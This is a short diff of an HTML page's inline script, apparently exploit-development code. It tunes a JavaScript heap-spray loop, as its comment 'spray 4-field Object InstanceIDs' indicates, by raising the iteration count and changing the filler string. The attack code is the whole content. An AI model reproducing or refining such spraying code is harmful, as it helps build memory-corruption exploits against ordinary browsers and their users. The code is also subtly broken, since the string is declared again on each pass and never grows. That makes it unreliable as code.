@@ -5,11 +5,11 @@
 
 <script>
 alert("Start?")
-   for (var i = 0; i < 4096; i++) {
+   for (var i = 0; i < 32000; i++) {
         let largeString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
             largeString += largeString;
             if (largeString.length > 1000000000) {
-                largeString = "A".repeat(1000000);
+                largeString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".repeat(1000000);
             }
         
      //= 50057; /* spray 4-field Object InstanceIDs */
